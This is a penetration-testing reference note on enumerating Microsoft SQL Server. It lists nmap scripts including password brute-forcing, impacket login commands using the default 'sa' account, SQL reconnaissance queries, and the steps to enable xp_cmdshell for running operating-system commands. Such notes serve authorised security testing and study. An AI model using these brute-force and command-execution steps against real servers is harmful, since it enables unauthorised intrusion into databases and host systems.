---
tags: [pentest, enumeration, mssql, database, recon, windows]
tool: impacket-mssqlclient, nmap
phase: 3
---
# MSSQL Enumeration

Microsoft SQL Server (port 1433). Default `sa` account, xp_cmdshell, and linked servers make this a high-value target.

[[04 - Enumeration/00 - README|Folder index]]

## nmap scripts

```bash
nmap --script ms-sql-info -p 1433 10.10.10.10
nmap --script ms-sql-brute -p 1433 10.10.10.10
nmap --script ms-sql-empty-password -p 1433 10.10.10.10
nmap --script ms-sql-ntlm-info -p 1433 10.10.10.10
```

## Connect with impacket

```bash
impacket-mssqlclient sa:'password'@10.10.10.10
impacket-mssqlclient corp.local/user:'password'@10.10.10.10 -windows-auth
```

## Key enumeration queries

```sql
-- Version
SELECT @@version;

-- Current user
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- Databases
SELECT name FROM sys.databases;

-- Current database
SELECT DB_NAME();

-- Tables
SELECT * FROM information_schema.tables;

-- Is sysadmin?
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Linked servers
EXEC sp_linkedservers;
SELECT * FROM openquery("linked_server", 'SELECT @@version');
```

## Enable xp_cmdshell (if sysadmin)

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## See also

- [[34 - MySQL Enumeration]] — MySQL equivalent
- [[05 - NetExec (nxc)]] — `nxc mssql` for spray/enum
